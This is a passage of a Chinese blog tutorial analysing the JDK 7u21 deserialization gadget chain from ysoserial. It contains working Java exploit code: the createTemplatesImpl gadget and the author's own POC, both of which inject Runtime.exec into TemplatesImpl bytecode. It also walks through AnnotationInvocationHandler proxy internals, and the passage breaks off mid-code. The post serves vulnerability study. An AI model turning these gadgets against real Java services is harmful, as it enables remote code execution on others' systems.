不能为null。</p></blockquote><p>但其实这跟jdk版本是有关的，1.7下不同的jdk版本这段代码是不同的。</p><p>1.7u80版本的<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#defineTransletClasses</code>中就是存在<code>_tfactory.getExternalExtensionsMap()</code>这句代码的。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g9h9qsg3wij31z017owp4.jpg" alt="7u80的_tfactory.png"></p><p>在1.7u80中，注释Gadgets类中添加 <code>_tfactory</code>这个字段的代码后（之后我们将详细分析Gadgets类），_tfactory=null就会发生null指针报错。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g9h9qjqzp0j31pj0yg78q.jpg" alt="7u80报错.png"></p><blockquote><p>细心的同学可以注意到上面jdk1.7u80两个弹框成功不成功的下方都会null指针报错。</p><p>但是前者是在执行恶意代码AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();后<br>的translet.postInitialization();处报错。</p><p>而后者是在恶意代码执行之前的defineTransletClasses函数报错。即没有成功执行payload</p></blockquote><p>在同样注释<code>_tfactory</code>这个字段的代码的情况下，使用jdk1.7u21的环境，却可以成功执行，因为jdk1.7u21的情况下并没有<code>_tfactory.getExternalExtensionsMap()</code>这句代码。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g9h9p99qusj31sd15pgxk.jpg" alt="7u21的_tfactory.png"></p><p>但是1.7u21也可以兼容给_tfactory赋值的情况，所以还是给 _tfactory 赋值比较好，可以兼容不同的版本。</p><h3 id="TemplatesImpl恶意类的限制条件"><a href="#TemplatesImpl恶意类的限制条件" class="headerlink" title="TemplatesImpl恶意类的限制条件"></a>TemplatesImpl恶意类的限制条件</h3><p>至此总结我们构筑一个恶意的TemplatesImpl类，在调用这个恶意类的getOutputProperties方法时，需要满足的限制条件。即，构筑恶意TemplatesImpl类的需要条件。</p><ol><li>TemplatesImpl类的 <code>_name</code> 变量 != null</li><li>TemplatesImpl类的<code>_class</code>变量 == null</li><li>TemplatesImpl类的 <code>_bytecodes</code> 变量 != null</li><li>TemplatesImpl类的<code>_tfactory</code>需要是一个拥有getExternalExtensionsMap()方法的类，使用jdk自带的TransformerFactoryImpl类</li><li>TemplatesImpl类的<code>_bytecodes</code>是我们代码执行的类的字节码。<code>_bytecodes</code>中的类必须是<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>的子类</li><li>我们需要执行的恶意代码写在<code>_bytecodes</code> 变量对应的类的静态方法或构造方法中。</li></ol><h2 id="构筑POC"><a href="#构筑POC" class="headerlink" title="构筑POC"></a>构筑POC</h2><p>回首漏洞原理的POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    TemplatesImpl calc = (TemplatesImpl) Gadgets.createTemplatesImpl(<span class="string">"calc"</span>);<span class="comment">//生成恶意的calc</span></span><br><span class="line">    calc.getOutputProperties();<span class="comment">//调用getOutputProperties就可以执行calc</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在分析完第二句触发漏洞的语句后。回来看第一句构筑。由于需要动态对于类结构进行操作，有使用到<a href="https://www.cnblogs.com/rickiyang/p/11336268.html" target="_blank" rel="noopener">Javassist包</a></p><p>Gadgets是ysoserial自主构建的一个利用类，看其中的createTemplatesImpl方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> TemplatesImpl <span class="title">createTemplatesImpl</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> TemplatesImpl templates = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1.使用一个自定义的满足条件的恶意模板类StubTransletPayload</span></span><br><span class="line">    <span class="comment">// 满足条件5：恶意类继承com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet。</span></span><br><span class="line">    ClassPool pool = ClassPool.getDefault();<span class="comment">//Javassist包中建立一个容器</span></span><br><span class="line">    <span class="comment">//添加自定义的恶意模板类StubTransletPayload的路径至容器的Classpath</span></span><br><span class="line">    pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(StubTransletPayload.class));</span><br><span class="line">    <span class="comment">//从Classpath中寻找自定义的恶意模板类StubTransletPayload，引入它，之后对它进行修改</span></span><br><span class="line">    <span class="keyword">final</span> CtClass clazz = pool.get(StubTransletPayload.class.getName());</span><br><span class="line">    <span class="comment">// 2.在自定义恶意类中添加静态模块，一句Rumtime.exec，命令从外部引入</span></span><br><span class="line">    <span class="comment">// 满足条件6：需要执行的恶意代码写在类的静态方法或构造方法中。</span></span><br><span class="line">    clazz.makeClassInitializer()</span><br><span class="line">            .insertAfter(<span class="string">"java.lang.Runtime.getRuntime().exec(\""</span></span><br><span class="line">                    + command.replaceAll(<span class="string">"\""</span>, <span class="string">"\\\""</span>)</span><br><span class="line">                    + <span class="string">"\");"</span>);</span><br><span class="line">    <span class="comment">// 3.设置一个唯一性的class名称</span></span><br><span class="line">    clazz.setName(<span class="string">"ysoserial.Pwner"</span> + System.nanoTime());</span><br><span class="line"><span class="comment">// 4. 把我们的自定义的恶意类转化成byte数组模式</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">byte</span>[] classBytes = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 添加byte数组classBytes至_bytecodes字段，再添加一个另外准备的Foo类的字节（目前来看是多余的）</span></span><br><span class="line">    <span class="comment">// 满足条件3：TemplatesImpl类的 `_bytecodes` 变量 != null</span></span><br><span class="line">    Reflections.setFieldValue(templates, <span class="string">"_bytecodes"</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][] &#123;</span><br><span class="line">            classBytes,</span><br><span class="line">            ClassFiles.classAsBytes(Foo.class)&#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. 满足条件1：TemplatesImpl类的 `_name` 变量 != null</span></span><br><span class="line">    Reflections.setFieldValue(templates, <span class="string">"_name"</span>, <span class="string">"Pwnr"</span>);</span><br><span class="line">    <span class="comment">// 6. 满足条件4：使TemplatesImpl类的_tfactory是一个拥有getExternalExtensionsMap()方法的类</span></span><br><span class="line">    Reflections.setFieldValue(templates, <span class="string">"_tfactory"</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">    <span class="comment">// 没有设置_class，满足条件2：TemplatesImpl类的`_class`变量 == null</span></span><br><span class="line">    <span class="keyword">return</span> templates;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>瞅一眼<code>StubTransletPayload</code>类的继承。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//很优秀的按照要求继承了AbstractTranslet类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">StubTransletPayload</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">5971610431559700674L</span>;</span><br><span class="line"><span class="comment">//以下看似是多余的，实际上是继承AbstractTranslet的必要，不然会报错。</span></span><br><span class="line"><span class="comment">//transform(DOM document, SerializationHandler[] handlers) 需要实现 AbstractTranslet 的一个虚拟类</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;&#125;</span><br><span class="line"><span class="comment">//下面这个函数 需要实现AbstractTranslet类对应的Translet接口的一个接口</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException </span>&#123;&#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>再瞅一眼往templates类的私有字段_bytecodes， _name ， _tfactory 这些属性中塞数据的<code>Reflections.setFieldValue</code>方法。这里是通过<strong>反射机制</strong>修改私有属性。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> Field field = getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);<span class="comment">//获取了对应的字段后，进行赋值。</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//Reflections#getField</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field field = clazz.getDeclaredField(fieldName);<span class="comment">//通过反射机制获取该字段</span></span><br><span class="line">        <span class="keyword">if</span> (field != <span class="keyword">null</span>)</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);<span class="comment">//接触private限制</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (clazz.getSuperclass() != <span class="keyword">null</span>)</span><br><span class="line">            <span class="comment">//判断父类，如果有父类，就获取父类的值，TemplatesImpl类没有父类，这里没用上。</span></span><br><span class="line">            field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以看到上面的Gadgets类完美符合了我们之前在利用过程中提到的全部需要条件。但是Gadgets构造的恶意TemplatesImpl类比起我们需要的POC条件多1处东西：</p><ol><li>_bytecodes多加了一个Foo.class类</li></ol><p>我始终没有找到这个到底有啥用，去掉后实验，没有任何影响。如果有老哥知道，可以联系我，非常感谢。</p><h3 id="payload位置static与构造函数"><a href="#payload位置static与构造函数" class="headerlink" title="payload位置static与构造函数"></a>payload位置static与构造函数</h3><p>自己构造一波payload，再分析一个payload放置位置的问题</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">jdk7u21_mine</span> </span>&#123;</span><br><span class="line">    <span class="comment">//从lala这个类中提取我们命令执行的字节码</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">lala</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//步骤一 TemplatesImpl类</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        CtClass cc = pool.get(lala.class.getName());</span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\"calc\");"</span>;</span><br><span class="line">        <span class="comment">//之前说的静态方法和构造方法均可，这边试一下构造方法</span></span><br><span class="line">        <span class="comment">//cc.makeClassInitializer().insertBefore(cmd);</span></span><br><span class="line">        <span class="comment">//这样可以直接添加构造函数</span></span><br><span class="line">        CtConstructor cons = <span class="keyword">new</span> CtConstructor(<span class="keyword">new</span> CtClass[]&#123;&#125;, cc);</span><br><span class="line">        cons.setBody(<span class="string">"&#123;"</span>+cmd+<span class="string">"&#125;"</span>);</span><br><span class="line">        cc.addConstructor(cons);</span><br><span class="line">        <span class="comment">//设置不重复的类名</span></span><br><span class="line">        String randomClassName = <span class="string">"LaLa"</span>+System.nanoTime();</span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line">        <span class="comment">//设置满足条件的父类</span></span><br><span class="line">        cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));</span><br><span class="line">        <span class="comment">//获取字节码</span></span><br><span class="line">        <span class="keyword">byte</span>[] lalaByteCodes = cc.toBytecode();</span><br><span class="line">        <span class="keyword">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;lalaByteCodes&#125;;</span><br><span class="line">        TemplatesImpl templates = TemplatesImpl.class.newInstance();</span><br><span class="line">        Reflections.setFieldValue(templates,<span class="string">"_bytecodes"</span>,targetByteCodes);</span><br><span class="line">        Reflections.setFieldValue(templates,<span class="string">"_name"</span>,<span class="string">"lala"</span>+System.nanoTime());</span><br><span class="line">Reflections.setFieldValue(templates,<span class="string">"_class"</span>,<span class="keyword">null</span>);</span><br><span class="line">        Reflections.setFieldValue(templates,<span class="string">"_tfactory"</span>,<span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        templates.getOutputProperties();</span><br><span class="line">        <span class="comment">//一样可以触发</span></span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><blockquote><p> 以上需要注意一个情况，我们的恶意字节码类lala类，使用了static修饰符。其实我们payload写在构造函数中是可以不使用static修饰符不会影响。</p><p>但是如果我们想把payload写在static初始化块中，类就需要使用static修饰符时。不然最后实例化是不会成功的。</p><p>就相当于是以下的情况，内部类是不允许存在static修饰符的，原理可以<a href="https://blog.csdn.net/u010454030/article/details/80548732" target="_blank" rel="noopener">参考</a>。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g9h9rk9yjlj30ky06ut8r.jpg" alt="static问题.png"></p><p>ps.突然发现非static方法块也是可以写payload…..但是不纠结这个了！！</p></blockquote><p>至此我们完成了恶意Templates类构造以及<code>TemplatesImpl.getOutputProperties</code>触发点的分析（当然从上面的调用过程，我们知道直接调用<code>TemplatesImpl.newTransformer()</code>也是一样的，getOutputProperties其实就是调用了newTransformer()，在接下来的延长链中其实漏洞触发是在newTransformer）。</p><p>目前的结论已经可以移花接木到fastjson的利用链中形成一套完成利用链。以及其他很多组件的利用链的最后一步都是TemplatesImpl类（限于jdk1.7版本，1.8会编译错误，原因未知）。</p><p>但是就单独作为一条利用链来说，只有exp触发点和一点点长度的利用链是不够的，我们需要继续延伸到一个反序列化readObject点，使服务端一触发反序列化，就可以沿着利用链到exp触发点。</p><h2 id="延长利用链——AnnotationInvocationHandler"><a href="#延长利用链——AnnotationInvocationHandler" class="headerlink" title="延长利用链——AnnotationInvocationHandler"></a>延长利用链——AnnotationInvocationHandler</h2><p>AnnotationInvocationHandler这是一个熟悉的类，在commons-collections一文的1.7最基础的利用链中，我们正是使用了AnnotationInvocationHandler的readobject函数作为反序列化入口点。</p><p>然而这里跟AnnotationInvocationHandler的invoke函数有关。在这之前我们需要先了解java的动态代理性质。</p><h3 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h3><p>动态代理是java的特性之一，其实就可以理解为web应用中的拦截器，在执行正式代码之前先过一个拦截器函数（比如spring的AOP）。但是以上类比只是为了便于理解，实际上spring的AOP之类的拦截器反而是基于java的动态代理实现的。</p><p>下面将举例动态代理SubjectImpl类，即在SubjectImple类前面建立一个拦截器。</p><p><code>DynamicProxy.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 需要实现的接口（拦截动作是基于接口的，所以需要设定接口）</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">ISubject</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">hello</span><span class="params">(String str)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实际的需要被代理的对象</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SubjectImpl</span> <span class="keyword">implements</span> <span class="title">ISubject</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">hello</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"SubjectImpl.hello(): "</span> + str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Handler对象（继承InvocationHandler的拦截器）</span></span><br><span class="line"><span class="comment">//InvocationHandler是一个用于跟Proxy类对接的接口</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Object subject;</span><br><span class="line">    <span class="comment">//构造函数，传入被代理实现类的实例</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Handler</span><span class="params">(Object subject)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.subject = subject;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//所有被Proxy拦截的函数都会经过这个接口的invoke函数</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object object, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"before!"</span>);</span><br><span class="line">        <span class="comment">//完成拦截操作之后去调用被代理实现类，反射机制，传入实例，参数</span></span><br><span class="line">        method.invoke(<span class="keyword">this</span>.subject, args);</span><br><span class="line">        System.out.println(<span class="string">"after!"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DynamicProxy</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//被代理类</span></span><br><span class="line">        SubjectImpl subject = <span class="keyword">new</span> SubjectImpl();</span><br><span class="line">        <span class="comment">//拦截器实现类，通过构造函数传入被代理类的实例</span></span><br><span class="line">        InvocationHandler tempHandler = <span class="keyword">new</span> Handler(subject);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用Proxy.newProxyInstance创建代理</span></span><br><span class="line">        ISubject iSubject = (ISubject) Proxy.newProxyInstance(DynamicProxy.class.getClassLoader(), <span class="keyword">new</span> Class&lt;?&gt;[] &#123;ISubject.class&#125;, tempHandler);</span><br><span class="line">        iSubject.hello(<span class="string">"world!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Proxy.newProxyInstance</code>三个传入参数：</p><ul><li>loader，选用的类加载器。感觉随便选就好了。</li><li>interfaces，被代理类所实现的接口，这个接口可以是多个。（即需要拦截的接口）</li><li>h，一个 实现拦截器的invocation handler。</li></ul><p>之后只要我们调用了返回之后的对象中被安排了代理的接口，就会进入invocationHandler的invoke函数。</p><p>以上执行结果就是：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">before!</span><br><span class="line">SubjectImpl.hello(): world!</span><br><span class="line">after!</span><br></pre></td></tr></table></figure><p>那么动态代理大概就分为几个部分：</p><ol><li>被代理的接口类</li><li>被代理的接口类的实现类</li><li>继承InvocationHandler接口、实现invoke方法的拦截器类</li><li>Proxy.newProxyInstance完成拦截器，与被代理的接口类的绑定</li><li>调用这个返回对象的被代理接口即可。（此处注意这个返回的对象不是只有被代理的接口类中的接口，还有一些常用接口，之后会截图说明。）</li></ol><p>我们说了那么多动态代理机制，是为啥呢？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnnotationInvocationHandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="comment">//实现了InvocationHandler接口的invoke函数</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object var1, Method var2, Object[] var3)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实就是因为AnnotationInvocationHandler类其实是一个InvocationHandler接口的实现类。它不只是在cc的利用链中作为反序列化点，还是作为动态代理的拦截器实现函数(有一个自己的invoke方法)</p><h3 id="动态代理链接AnnotationInvocationHandler与Templates"><a href="#动态代理链接AnnotationInvocationHandler与Templates" class="headerlink" title="动态代理链接AnnotationInvocationHandler与Templates"></a>动态代理链接AnnotationInvocationHandler与Templates</h3><p>我们的目的是连接代理后的对象Proxy的equal方法到Templates的newTransformer方法。</p><p>当建立动态代理后（Proxy.newInstance返回一个对象a），我们假设调用a.b(c)</p><p>先瞅一眼AnnotationInvocationHandler的构造函数有个底，我们可以知道有可控的this.type与this.memberValues</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">    <span class="keyword">this</span>.type = var1;</span><br><span class="line">    <span class="keyword">this</span>.memberValues = var2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>bytheway，这里的AnnotationInvocationHandler构造函数是缺省修饰符，它在不同的包中是不能直接调用的。</p><p>反射机制中有说到，可以使用setAccessible(true)来开放权限。</p></blockquote><p>调用a.b(c)。 <code>sun.reflect.annotation.AnnotationInvocationHandler#invoke</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//var1 当前的Proxy代理实例对象，即a.b(c)的a</span></span><br><span class="line"><span class="comment">//var2 当前调用的方法，即a.b(c)的b</span></span><br><span class="line"><span class="comment">//var3 当前调用方法的传入参数列表，即a.b(c)的c</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object var1, Method var2, Object[] var3)</span> </span>&#123;</span><br><span class="line">        String var4 = var2.getName();<span class="comment">//被调用方法名</span></span><br><span class="line">        Class[] var5 = var2.getParameterTypes();<span class="comment">//获取传入参数类型列表</span></span><br><span class="line">    <span class="comment">//如果调用的方法名是equals，传入一个参数，并且为Object类型,即a.equal((Object.class)c)</span></span><br><span class="line">    <span class="comment">//此处的意思应该为判断a是否与传入的c完全相等。</span></span><br><span class="line">        <span class="keyword">if</span> (var4.equals(<span class="string">"equals"</span>) &amp;&amp; var5.length == <span class="number">1</span> &amp;&amp; var5[<span class="number">0</span>] == Object.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.equalsImpl(var3[<span class="number">0</span>]);<span class="comment">//我们进入此处，传入的是a.b(c)中的c的第一个参数</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure><p><code>sun.reflect.annotation.AnnotationInvocationHandler#equalsImpl</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//var1 a.b(c)的c</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> Boolean <span class="title">equalsImpl</span><span class="params">(Object var1)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// var1 若为AnnotationInvocationHandler类，就相等</span></span><br><span class="line">        <span class="keyword">if</span> (var1 == <span class="keyword">this</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        <span class="comment">// var1 应该为this.type的实例 （此处为一个要求）</span></span><br><span class="line">        <span class="comment">// 此处意思应该是只能比较this.type中规定好的类是否完全一致</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">this</span>.type.isInstance(var1)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//如果是this.type（可控）中的类的实例的话</span></span><br><span class="line">            <span class="comment">//就要开始获取this.type这个类中的所有方法</span></span><br><span class="line">            Method[] var2 = <span class="keyword">this</span>.getMemberMethods();</span><br><span class="line">            <span class="keyword">int</span> var3 = var2.length;</span><br><span class="line">   <span class="comment">//去对应着遍历调用c对象中的Methods方法</span></span><br><span class="line">         